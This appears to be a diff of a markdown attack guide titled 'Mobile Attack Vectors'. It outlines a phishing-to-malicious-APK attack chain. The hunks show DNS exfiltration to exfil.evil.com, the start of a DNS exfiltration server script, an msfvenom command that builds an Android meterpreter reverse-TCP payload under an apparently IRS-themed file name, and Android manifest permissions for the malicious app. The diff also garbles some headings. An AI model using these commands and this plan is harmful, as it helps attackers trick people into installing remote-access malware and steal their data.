@@ -1,15 +1,15 @@
-#  Mobile Attack Vectors
+  Mobile Attack Vectors
 
-## Attack Chain Overview
+  Attack Chain Overview
 1. **Phishing Site** → Social engineering for credentials
 2. **APK Delivery** → Malicious app download
 3. **Device Exploitation** → Root access & persistence
 4. **Data Exfiltration** → Multiple covert channels
 
-## Data Exfiltration Methods
+  Data Exfiltration Methods
 
-### Localhost Simulation vs Real-World
-**Current Setup (Localhost):**
+   Real-World
+ Current Setup (Localhost):**
 - HTTP beacons to localhost:5000
 - Base64 encoded data in image requests
 - localStorage persistence
@@ -25,7 +25,7 @@
 dig 123456789.exfil.evil.com
 ```
 
-### Real-World DNS Exfiltration Setup
+  Real-World DNS Exfiltration Setup
 ```python
 # dns_exfil_server.py - Real DNS exfiltration
 import socket
@@ -59,7 +59,7 @@ msfvenom -p android/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -o irs_secu
 # Create minimal Android project with malicious intent
 ```
 
-### APK Manifest Permissions
+   APK Manifest Permissions
 ```xml
 <!-- AndroidManifest.xml for APK -->
 <uses-permission android:name="android.permission.INTERNET" />
